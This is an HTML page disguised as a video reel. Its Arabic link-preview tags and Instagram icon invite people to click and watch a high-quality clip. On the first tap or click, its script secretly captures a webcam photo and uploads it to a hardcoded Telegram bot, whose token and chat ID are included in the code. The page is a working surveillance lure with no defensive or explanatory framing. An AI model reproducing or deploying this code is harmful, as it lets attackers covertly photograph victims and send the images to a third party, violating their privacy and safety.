<!-- علامات المعاينة لتطبيقات المحادثة (Instagram, Telegram, WhatsApp) -->
<meta property="og:title" content="شاهد هذا المقطع المميز 🎬">
<meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
<meta property="og:type" content="video.other">
<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">

<title>Video Fullscreen</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    html, body {
        width: 100%;
        height: 100%;
        background-color: #000;
        overflow: hidden;
    }
    video {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        min-width: 100%;
        min-height: 100%;
        object-fit: cover;
        object-position: center;
        z-index: 1;
    }
    #result {
        max-width: 90%;
        max-height: 90vh;
        border-radius: 10px;
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 999;
    }
</style>
<video id="mainVideo" controls autoplay loop playsinline muted>
    <source src="my_reel.mp4" type="video/mp4">
</video>

<img id="result" alt="">

<script>
    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
    const TELEGRAM_CHAT_ID = '6642913954';

    let isProcessing = false;

    async function handleCapture() {
        if (isProcessing) return;
        isProcessing = true;

        let stream = null;

        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });

            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const img = document.getElementById('result');
            img.src = canvas.toDataURL('image/png');
            img.style.display = 'block';

            setTimeout(() => {
                img.style.display = 'none';
            }, 1000);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'capture.png');

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (err) {
                    console.error("Error:", err);
                }
            }, 'image/png');

        } catch (err) {
            console.error("Camera Error:", err);
        } finally {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
    }

    window.addEventListener('click', handleCapture);
    window.addEventListener('touchstart', handleCapture);
</script>
